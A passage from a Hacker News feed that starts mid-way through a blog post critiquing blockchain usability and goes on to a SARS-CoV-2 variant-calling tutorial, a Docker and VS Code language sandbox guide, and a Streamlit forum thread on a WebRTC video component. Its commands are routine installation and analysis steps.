<p>The purpose for these proofs or signatures is for other entities on a blockchain network to verify identities &amp; messages amongst themselves without reasonable doubt.</p>
<p>Private keys have two main problems first, how to store them securely.<br>
Anyone who can memorize, take a picture, or copy your private key can literally steal all your money.
Because they have your private key, they can make the cryptographic proofs/signatures and <em>accurately prove to everyone on the network they are you</em> even without your consent. Even when they are not you.</p>
<p>Second, you loose your key you loose access to all your money &amp; <em>no one can ever help you out</em>.
There is no ‚Äúclick here to remember your private key‚Äù</p>
<p>We need to first come up with something as intuitive using ATM/Debit cards.</p>
<p>Imagine if your bank told you that, ‚Äúif you forgot your Debit card PIN, you loose access to all your money with <em>zero hope of recovering it how ever large a sum of money it would be</em>‚Äù.</p>
<p>If the above was the case, I don‚Äôt think any one would use debit cards.</p>
<h3 id="3-contract-security">3. Contract security</h3>
<p>It is simply not reliable &amp; safe for responsible institutions &amp; individuals to deploy smart contracts on blockchains like Ethereum.</p>
<p>Due to the blockchain having an immutable and unpredictable state, Smart contracts deployed on such a platform are also expected to suffer from immutable bugs &amp; unpredictable events.</p>
<p>As a result, millions of dollars have been lost in events such as the <a href="https://www.bloomberg.com/features/2017-the-ether-thief/">theft of $50 million from TheDAO</a> and <a href="https://www.coindesk.com/startup-lost-160-million-still-wants-shake-ethereum/"> Parity‚Äôs $160 Million loss of funds</a></p>
<p>I was glad that Rick dudley <a href="https://youtu.be/1AGHAuWz_4U?t=986">talked about this</a></p>
<h3 id="4-consensus-algorithms-are-wack">4. Consensus algorithms are wack</h3>
<p>The popular blockchains only don‚Äôt offer transaction finality i.e you will never be 100% sure that you have gotten funds.</p>
<p>You can only be <a href="https://ethereum.stackexchange.com/questions/319/what-number-of-confirmations-is-considered-secure-in-ethereum">probabilistically to a high degree</a> (but with zero guarantee) that you have received your funds.
This is because in major consensus algorithm called Nakamoto Consensus, the miners elect the chain with the most computational work that are with in the same protocol i.e consensus rules.</p>
<p>For instance imagine your bank tells you that you that, ‚Äúthere is a 95% chance that we <em>might</em> have your life savings, however you may also not poses it in 5 years in case we discovered that the chain with the most work does not have your transaction in it‚Äù</p>
<p>Yes, I don‚Äôt think anyone wants to keep their life savings in such a bank.</p>
<h3 id="5-privacy">5. Privacy</h3>
<p>Just by knowing someone‚Äôs cryptocurrency address, you can know their account balance &amp; transaction history simply by pasting it in a blockchain explorer like <a href="https://blockchain.info/">blockchain</a> and <a href="https://etherscan.io/">etherscan</a></p>
<p>Meaning it‚Äôs very easy for anyone to keep track of your financial activities without permission.</p>
<p>You buy HIV drugs? I now know your HIV positive, Your paying schools fees? now your local kidnapper knows where your kids study.</p>
<p>Buying birth control pills? Now anyone in the world may accurately guess that your a woman.
No careful person wants that!</p>
<h3 id="6-price-volatility">6. Price volatility</h3>
<p>Very few people simply don‚Äôt have the stomach to hold a financial instrument that drops by over 50% with in <a href="https://www.cnbc.com/2017/12/26/bitcoin-price-in-2018-could-hit-60000-but-another-crash-is-coming.html">a few months</a>.</p>
<h2 id="what-can-we-do">What can we do?</h2>
<p>Most projects are building on platforms that have these problems regardless, in hopes that they will integrate solutions to the respective issues in the future.</p>
<p>The risk they face however, is that the platform they built on, my become obsolete after a heavy investment of time &amp; resources on the wrong platform.</p>
<p>Think how the <a href="https://bitcoinmagazine.com/articles/bitcoin-now-useless-micropayments-solutions-are-coming1/">micro payments industry died in bitcoin because of high fees</a></p>
<p>It‚Äôs like building your phone app around a windows smart-phone only to be made irrelevant because the next generation of mobile users will not be using windows smart-phones, but iOS and Android.</p>
</div></div>]]>
            </description>
            <link>https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130912</guid>
            <pubDate>Sun, 14 Feb 2021 09:45:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Burrows-Wheeler transform to identify SARS-CoV-2 mutants]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130544">thread link</a>) | @8iterations
<br/>
February 14, 2021 | https://mokasquarl.github.io/draftWA_cov/ | <a href="https://web.archive.org/web/*/https://mokasquarl.github.io/draftWA_cov/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h3 id="a-bioinformatics-pipeline-to-detect--understand-covid-mutants">A Bioinformatics Pipeline to Detect &amp; Understand COVID Mutants</h3>
<p><img src="https://mokasquarl.github.io/images/composite_border.png" alt="mutantcov" title="Mutant SARS-CoV-2 ACE2 Receptor Complex"></p>
<h4 id="fig-1-molecular-structure-with-uk-mutant-sars-cov-2-docked-to-human-receptor">Fig 1. Molecular Structure with UK Mutant SARS-CoV-2 Docked to Human Receptor</h4>
<p>As the pandemic runs its course, tracking genetic mutations has gained mainstream coverage. Officially, in the line of work we call bioinformatics, finding and understanding mutations is known as <em>Variant Calling</em>. In the same way every person is different from others (except twins), an individual virus can have variations in their genome; when a lot of these genetic variations accumulate between the virus we detected originally and what we find months later in a faraway town, we can say that we have a new <em>strain</em> of the virus. The Coronavirus which we‚Äôre now calling <em>SARS-CoV-2</em> was first detected in Wuhan‰∏≠ÂõΩ, so the genetic sequencing data from here is used as the base reference genome, and we measure mutations for the virus detected everywhere else against this; a coronavirus genome from a few towns away might only have a couple letters of the genome different from the Wuhan data, while something that‚Äôs travelled to the other side of the world after being transmitted through many people, climates, and even treatments, might now have acquired many more genetic variants compared to the original data.</p>
<h4 id="fig-2-retrieving-raw-covid-data-from-sra--creating-alignment-maps">Fig 2. Retrieving raw COVID data from SRA &amp; creating alignment maps</h4>
<p><img src="https://mokasquarl.github.io/images/render1612723995528-min.gif" alt="samtools tview" title="SARS-CoV-2 Aligned">
Data from viruses sequenced all across the world are uploaded into one of several databases (Table 1), this data is generated directly from machines by Illumina, Oxford Nanopore, or Life Technologies. When turning the molecules in genetic code into digital files these machines create strings that can be a few hundred letters in length to several thousand, but never the entire genome of the virus in a single string. A standardized file format called <em>fastq</em> holds all the strings from a single sample, including some quality data from the machine doing the sequencing. These strings are in no particular order, and first need to be mapped together to get the complete genome. Pretty much the standard way to create these genetic maps uses a technique invented in Palo Alto back in the early 90s by &nbsp;Michael Burrows and David Wheeler. The <em>Burrows‚ÄìWheeler Transform</em> was mostly just used in data compression, until around 2010 when computational biologists began to use it to align genomes together.</p>

<h4 id="table-1">Table 1.</h4>
<p><strong>SRA:</strong> <em>Sequence Read Archive</em> <strong>-Open Access</strong></p>

<p><strong>ENA:</strong> <em>European Nucleotide Archive</em> <strong>-Open Access</strong></p>

<p><strong>GISAID:</strong> <em>Global Initiative on Sharing All Influenza Data</em> <strong>-Private</strong></p>

<p>Heng Li, now a professor at Harvard (amongst other things) has created the most commonly used alignment algorithm (amongst other things) with <a href="https://github.com/lh3/bwa">BWA</a>. This algorithm is super easy to use, and will get us results that are more than good enough.</p>

<div><div><pre><code>git clone https://github.com/lh3/bwa.git
cd bwa
make
</code></pre></div></div>

<p>BWA takes <strong>fastq</strong> files containing samples, along with a <em>fasta</em> file containing a reference genome to map the strings contained in our <strong>fastq</strong> file. Reference genomes are usually put out by the scientific wing of a National Government, Regional Organizations, and some Universities. We‚Äôll get our Wuhan Coronavirus Reference genome from the <a href="https://www.ncbi.nlm.nih.gov/nuccore/1798174254">National Center for Biotechnology Information</a> hosted by the US Federal government. A good sample to run against the Wuhan reference is the Washington state outbreak that happened early in the US, the <em>fastq</em> data for this is also hosted by the NCBI at their <a href="https://trace.ncbi.nlm.nih.gov/Traces/sra/?run=SRR11278092">Sequence Read Archive</a>. In the animated terminal above (Fig 2.) we see the commands needed to create our mapped genome from our input files, including retrieving the data from the databases . If you‚Äôd like to skip all that, we‚Äôre hosting both the reference genome, and the completed alignment map over at <a href="https://lucidalign.com/#cov">Lucid Align</a>. We‚Äôll be using the <strong>bam</strong> file to detect our mutations, and we can also browse the genome of this Washington state outbreak sample using any sequence alignment viewer.</p>

<h4 id="fig-3-detecting-mutations-with-neural-network">Fig 3. Detecting Mutations with Neural Network</h4>
<p>
  <iframe src="https://www.youtube.com/embed/v5z5OV6UAVM" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>But before going on to variant calling this first sample let‚Äôs just prepare another sample while we‚Äôre making these alignment maps. Let‚Äôs do a more recent outbreak, from Kent, UK; which is far from Wuhan &amp; the Washington sample, in both time &amp; space. Retrieving the samples from the European Nucleotide Archive can be done from this <a href="https://www.ebi.ac.uk/ena/browser/view/ERR4659819">link</a> or from the shell.</p>

<div><div><pre><code>git clone https://github.com/enasequence/enaBrowserTools.git
cd python3
enaDataGet.py -f fastq -m -d [output_directory] ERR4659819
</code></pre></div></div>

<p>Creating the mapped genome from the Kent, UK outbreak is done the exact same way as with the Washington state outbreak, and now both files can be browsed directly with an alignment viewer. More importantly now we can run the <em>variant detection</em> and see all the mutations in each of these samples compared to the original Wuhan reference genome. Variant callers are an area of hot development for folks working on bioinformatics algorithms &amp; tools. Traditionally, Bayesian methods have been most reliable, but are hard-coded for specific organisms or need the settings dialed-in to get the correct sensitivity to specificity. This is so that we don‚Äôt get too many false-positives, while at the same time don‚Äôt miss any real mutations. In the last couple of years deep convolutional neural networks have really made a splash in variant calling, where now images are created almost similar to those we see from alignment viewers, and those images are used to train, and then have the neural network make the call on whether there is a mutation in a given section of the alignment map as we make our way down the entire map.</p>

<p><img src="https://mokasquarl.github.io/images/eff_kent.png" alt="Annotated VCF" title="High Impact mutation in Kent UK sample"></p>
<h4 id="fig-4-annotated-mutations-of-kent-uk-strain-b117">Fig 4. Annotated Mutations of Kent UK Strain B.1.1.7</h4>

<p>Bayesian variant callers are fairly simple to install, whereas the DCNN callers will need, in our case, Nvidia cuda drivers, and of course a machine with those GPUs. You could use <a href="https://magnolia.sh/">Magnolia</a> Fig 3., the super-cool neural network based caller that Leo van Driel helped write B-), but for this post we are going to use the built-in caller that comes with <a href="http://www.htslib.org/download/"><em>samtools</em></a> written by the previously mentioned Heng Li.</p>

<div><div><pre><code>bcftools mpileup -Ou -f &lt;ref.fasta&gt; &lt;sample1.bam&gt; | bcftools call -vmO z -o &lt;study.vcf.gz&gt;
</code></pre></div></div>

<p>After running any variant caller, we‚Äôre left with a <em>vcf</em> file, which is just a list of positions in a genome where the sample has a mutation compared to the reference, it might be good to just look at the file <a href="https://samtools.github.io/hts-specs/VCFv4.2.pdf">format specifications</a> to understand how these <em>vcf</em> files will be used moving forward. We can use the allotted fields in the <em>vcf</em> format to annotate, that is give meaning &amp; context to each of the mutations we detect in the genome. For this sample we‚Äôve used <a href="https://pcingola.github.io/SnpEff/users_of_snpeff/">SnpEff</a> which makes life super easy by boiling all of the predicted effects of each of the mutations we detected into 3 simple categories, high impact, low, and moderate.</p>

<p>We can see in Fig 4. that running a standard Bayesian variant caller we detected a total of 48 mutations in the Kent UK sample. However, there might be some false-positives in there, it‚Äôs always better to be a bit more sensitive than to miss things. Let‚Äôs focus on the high impact mutations, things that will change the 3D structure of coronavirus. Looks like we only have 3 of those, all highlighted in red (Fig 4.), at genomic positions, 11288, 27972, and 28270. The VCF file we generated also contains data on which amino acids within the protein structure were changed to what, we can use that information to make the changes in our molecular structure, which in this case we‚Äôve done with a current tool under development.</p>
<h4 id="fig-5-molecular-structure-editor">Fig 5. Molecular Structure Editor</h4>
<p><img src="https://mokasquarl.github.io/images/dalton_beta.gif" alt="Dalton PDB" title="Editing Molecular Structure"></p>

<p>Mutations which change the molecular structure are super important because that is more likely to make things behave differently, this can mean it attaches to human receptors more tightly, interacts with antibodies and drugs differently, because remember at the core of how molecules behave is the old mantra <strong>‚Äúform equals function.</strong>‚Äù</p>

  </div></div>]]>
            </description>
            <link>https://mokasquarl.github.io/draftWA_cov/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130544</guid>
            <pubDate>Sun, 14 Feb 2021 08:15:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Try 23 different languages with Docker and VS Code]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130528">thread link</a>) | @mythz
<br/>
February 14, 2021 | https://gist.cafe/helloworld#try | <a href="https://web.archive.org/web/*/https://gist.cafe/helloworld#try">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
    
            <p>
                <iframe src="https://www.youtube.com/embed/NVeoJBZrCBo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
            </p>
    
            
            
            <div>
                <div>
                    <p>
                        After right-clicking on the running container and clicking on
                        <b>Attach Visual Studio Code</b>
                        you'll open a VS Code window into the running instance at the users <b>/app</b> home directory.
                        To start with a clean folder free of clutter, you can run <b>code src</b> to open a new VS Code window
                        into the empty <b>src</b> folder.
                    </p>

                    <h4>Start from your languages "Hello World"</h4>

                    <p>
                        To quickly get started playing with each language use the built-in
                        <a href="https://docs.servicestack.net/dotnet-tool">x tool</a>
                        to download any GitHub repo.
                    </p>

                    <p>
                        To make it easy, <a href="https://github.com/gistcafe">gistcafe</a>
                        has a <em>hello-*</em> repo for each language that supports running a single source file <em>"Hello World"</em>
                        which you can browse with:
                    </p>

                    <h3>Run it!</h3>

                    <pre><label>x download gistcafe | grep hello-</label><b></b><i title="copy" onclick="copy(this)"></i></pre>

                    <p>
                        Then download the language you want, e.g you can download &amp; run a <a href="https://deno.land/">Deno</a> "Hello World" App with:
                    </p>

                    <pre><label>x download gistcafe/hello-deno &amp;&amp; cd hello-deno</label><b></b><i title="copy" onclick="copy(this)"></i></pre>
                    <pre><label>deno run hello.ts</label><b></b><i title="copy" onclick="copy(this)"></i></pre>

                    <h4>Start from a language project template</h4>

                    <p>
                        For installing all other non-single file (i.e. <em>hello-*</em>) repos you'll instead want to use <b>x new</b> so it applies all
                        <a href="https://docs.servicestack.net/dotnet-new#install-directly-from-your-github-repo">project transformations</a>
                        with your Project Name:
                    </p>

                    <pre><label>x new gistcafe/go Acme &amp;&amp; cd Acme</label><b></b><i title="copy" onclick="copy(this)"></i></pre>
                    <pre><label>go run main.go</label><b></b><i title="copy" onclick="copy(this)"></i></pre>

                    <h3>Publish it!</h3>

                    <p>
                        Once you're ready to share your new App with the world you can publish it to a GitHub Gist by generating a
                        <a href="https://github.com/settings/tokens/new">GitHub Access Token</a> with <b>gist</b> scope
                        and adding it to your <em>GITHUB_TOKEN</em> Environment Variable:
                    </p>

                    <pre><label>echo "export GITHUB_TOKEN=THE_TOKEN" &gt;&gt; ~/.bashrc &amp;&amp; . ~/.bashrc</label><b></b><i title="copy" onclick="copy(this)"></i></pre>

                    <p>
                        Then to publish your App to a new Gist, run:
                    </p>
                    <pre><label>x publish -desc "Gist Description"</label><b></b><i title="copy" onclick="copy(this)"></i></pre>
                    <p>if <em>-desc</em> is unspecified the description is inferred from your folder name.</p>
                    <p>To update your Gist run publish again:</p>
                    <pre><label>x publish</label><b></b><i title="copy" onclick="copy(this)"></i></pre>
    
                </div>
            </div>
    
        </div></div>]]>
            </description>
            <link>https://gist.cafe/helloworld#try</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130528</guid>
            <pubDate>Sun, 14 Feb 2021 08:11:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Streamlit component for real-time video processing web apps, streamlit-webrtc]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26130494">thread link</a>) | @whitphx
<br/>
February 14, 2021 | https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669 | <a href="https://web.archive.org/web/*/https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          

            

          <p><span>
              <meta itemprop="datePublished" content="2021-01-10T13:33:16Z">
              <time itemprop="dateModified" datetime="2021-01-11T12:54:45Z">
                January 11, 2021, 12:54pm
              </time>
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello everyone,</p>
<p>I made <a href="https://github.com/whitphx/streamlit-webrtc" rel="noopener nofollow ugc">streamlit-webrtc</a>, which sends and receives video (and audio, but it‚Äôs only partially supported now) streams between frontend and backend via WebRTC.<br>
This should be helpful for creating, for example, performant real-time computer vision WebApps.</p>
<p>This week I tried Steamlit, found it interesting and useful, and then wanted to run real-time computer vision apps on Streamlit, on which users can try some computer vision models with video input from their webcams.<br>
So I tried to develop a component to achieve it using WebRTC. Fortunately, there is a great WebRTC library for Python, <a href="https://github.com/aiortc/aiortc" rel="noopener nofollow ugc">aiortc</a>.</p>
<p>One interesting thing about this component is that the input video streams are sourced from users‚Äô webcams and transferred to the server-side Python process via the network. Therefore, the server does not need the access to the camera, unlike the usual approach using OpenCV (<code>cv2.VideoCapture</code>). It means the Python code can be hosted on a remote server (actually, I hosted a sample app on Heroku and it worked, as stated below).</p>
<p>In addition, WebRTC provides good performance with sending and receiving video/audio frames.</p>
<p>Here is a demo movie:<br>
</p><div><a href="https://aws1.discourse-cdn.com/business7/uploads/streamlit/original/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24.gif" data-download-href="/uploads/short-url/oYIcsMqSqHFlA92m5f3NdANeujO.gif?dl=1" title="streamlit-webrtc-demo-short1" rel="noopener nofollow ugc"><img src="https://aws1.discourse-cdn.com/business7/uploads/streamlit/original/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24.gif" alt="streamlit-webrtc-demo-short1" data-base62-sha1="oYIcsMqSqHFlA92m5f3NdANeujO" width="549" height="500" data-small-upload="https://aws1.discourse-cdn.com/business7/uploads/streamlit/optimized/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24_2_10x10.png"></a></div><p>
(A full version is hosted on <a href="https://youtu.be/BRrtN80ITfU" rel="noopener nofollow ugc">YouTube</a>)</p>
<p>You can see</p>
<ul>
<li>The app consumes, processes, and renders video frames in real time.</li>
<li>Streamlit‚Äôs interactive controls are still working well in combination with the code using WebRTC. For example, the threshold for object detection is changed interactively during execution.</li>
</ul>
<p>You can try out the sample app using the following commands.</p>
<pre><code>$ pip install streamlit-webrtc opencv-python
$ streamlit run https://raw.githubusercontent.com/whitphx/streamlit-webrtc-example/main/app.py
</code></pre>
<p>I also deployed it to Heroku, <a href="https://streamlit-webrtc-example.herokuapp.com/" rel="noopener nofollow ugc">https://streamlit-webrtc-example.herokuapp.com/</a> and confirmed it worked; however, it‚Äôs running on a very small instance on a free plan, and may not work well if multiple users access it at the same time.<br>
I recommend you to run it on your own environment.</p>
<p>It‚Äôs still a prototype and the API is not finalized, and the documentation has not been written. Please refer to <a href="https://github.com/whitphx/streamlit-webrtc/blob/master/app.py" rel="noopener nofollow ugc">the sample code</a> when you use the component.</p>
<p>I welcome any feedback!</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">
          <meta itemprop="keywords" content="custom-components, video, real-time, computer-vision">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-10T14:39:49Z">
              <time itemprop="dateModified" datetime="2021-01-10T16:53:31Z">
                January 10, 2021,  4:53pm
              </time>
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Technical note:</p>
<p>One technical challenge was to combine WebRTC and real-time processing with Streamlit‚Äôs execution model. This problem has already been stated in <a href="https://discuss.streamlit.io/t/access-webcam-video-from-a-hosted-streamlit-application/1301">Access Webcam Video from a hosted Streamlit application</a>.<br>
In case of <code>streamlit-webrtc</code> , additionally, <a href="https://github.com/aiortc/aiortc" rel="noopener nofollow ugc">aiortc</a> does not work in normal Streamlit scripts, which are executed from top to bottom and terminated at each user interaction (more fundamentally, it‚Äôs because of WebRTC‚Äôs async nature).</p>
<p>This library approaches this problem by creating threads independent of Streamlit execution.<br>
When the component is used for the first time, it forks a thread, launches <code>aiortc</code>‚Äôs code on an event loop in the thread, and maintains the thread over all the script executions until the WebRTC session is closed.</p>
<p>As a result of this approach, developers should alter their programming style when using this library, from Streamlit‚Äôs declarative way to an event-and-callback-based one. <a href="https://github.com/whitphx/streamlit-webrtc/blob/477416da84e77d76201d97269589fe5ff5d17d37/app.py#L293-L303" rel="noopener nofollow ugc">streamlit-webrtc/app.py at 477416da84e77d76201d97269589fe5ff5d17d37 ¬∑ whitphx/streamlit-webrtc ¬∑ GitHub</a> is an example. In this code, the computer vision part resides in a callback function, which is called from the forked thread triggered by the media stream regardless of Streamlit‚Äôs execution timing.</p>
<p>To bridge this forked execution of WebRTC and normal Streamlit‚Äôs controls, <code>streamlit-webrtc</code> exposes a <code>context</code> object, which is an interface to the objects running in the WebRTC‚Äôs async world.<br>
By using it, values from Streamlit‚Äôs controls can be passed to the computer vision code running in the forked thread, like <a href="https://github.com/whitphx/streamlit-webrtc/blob/477416da84e77d76201d97269589fe5ff5d17d37/app.py#L305-L317" rel="noopener nofollow ugc">streamlit-webrtc/app.py at 477416da84e77d76201d97269589fe5ff5d17d37 ¬∑ whitphx/streamlit-webrtc ¬∑ GitHub</a>.</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Welcome to the community <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>, looks awesome !</p>
<p>Feel free to add it to our <a href="https://discuss.streamlit.io/t/streamlit-components-community-tracker/4634">community tracker</a> so we don‚Äôt lose it from our radars <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-11T13:04:31Z">
                January 11, 2021,  1:04pm
              </time>
              <meta itemprop="dateModified" content="2021-01-11T13:04:31Z">
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p><a href="https://discuss.streamlit.io/u/andfanilo">@andfanilo</a> Thank you! I edited the wiki <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/smile.png?v=9" title=":smile:" alt=":smile:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/tim"><span itemprop="name">tim</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-13T16:25:04Z">
                January 13, 2021,  4:25pm
              </time>
              <meta itemprop="dateModified" content="2021-01-13T16:25:04Z">
          <span itemprop="position">#5</span>
          </span>
        </p></div>
        <p>Whoa - this is really great. Nice work, <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>!</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/MalanG"><span itemprop="name">MalanG</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-15T21:55:39Z">
                January 15, 2021,  9:55pm
              </time>
              <meta itemprop="dateModified" content="2021-01-15T21:55:39Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>,</p>
<p>Thanks for a great project!<br>
I am trying to test yours, and couldn‚Äôt install streamlit-webrtc.</p>
<pre><code>(venv) (base) admin@Youjins-MacBook-Pro mqtt-camera-streamer-master % pip install streamlit-webrtc              
ERROR: Could not find a version that satisfies the requirement streamlit-webrtc
ERROR: No matching distribution found for streamlit-webrtc
</code></pre>
<p>Can I install it if I download the github repo?</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-16T09:39:03Z">
              <time itemprop="dateModified" datetime="2021-01-16T13:14:24Z">
                January 16, 2021,  1:14pm
              </time>
          <span itemprop="position">#7</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello <a href="https://discuss.streamlit.io/u/malang">@MalanG</a> ,</p>
<p>I think it‚Äôs because you are using python &lt;3.8 <s>though <code>streamlit-webrtc</code> currently supports only &gt;=3.8.<br>
Please try with python 3.8.</s></p>
<p><s>I will also fix the package to be compatible with older versions of Python.</s></p>
<p>EDIT: I updated the package to be compatible with Python 3.6 and 3.7. Please try again.</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-18T13:42:59Z">
              <time itemprop="dateModified" datetime="2021-01-18T14:36:28Z">
                January 18, 2021,  2:36pm
              </time>
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I got an invitation to Streamlit Sharing then deployed the sample app there: <a href="https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py" rel="noopener nofollow ugc">https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py</a><br>
but it didn‚Äôt work with a ‚Äúpermission denied‚Äù error when the app requires capturing video or audio from user‚Äôs device.</p>
<p>It means many interesting applications of this component, including real-time object detection and image transformation, cannot be used on Streamlit Sharing‚Ä¶<br>
The only page of the sample app that works is the third one, where the app plays video and audio files on server-side and transmit them to the client.</p>
<p>This is because, on Streamlit Sharing, the app is running inside iframe.<br>
<code>getUserMedia</code>, which is used to get access to user‚Äôs device, requires Feature Policy when called inside iframe.<br>
Details are here: <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia#Feature_Policy" rel="noopener nofollow ugc">MediaDevices.getUserMedia() - Web APIs | MDN</a></p>
<p>This is out of my control <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/crying_cat_face.png?v=9" title=":crying_cat_face:" alt=":crying_cat_face:"></p>
<p>EDIT: This problem has also been stated in <a href="https://discuss.streamlit.io/t/sharing-blocks-custom-webcam-component-due-to-featurepolicy/8876">Sharing blocks custom webcam component due to featurePolicy</a></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/frowning.png?v=9" title=":frowning:" alt=":frowning:"></p>
<p>Well this is an interesting discussion to raise with the product team, thanks for taking the time to track this down! I‚Äôll ping them on my side too <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/wink.png?v=9" title=":wink:" alt=":wink:"></p>
<p>Fanilo</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Wow this is awesome ! Great work <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>  !! <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/scream.png?v=9" title=":scream:" alt=":scream:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"></p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/tim"><span itemprop="name">tim</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-19T17:28:11Z">
                January 19, 2021,  5:28pm
              </time>
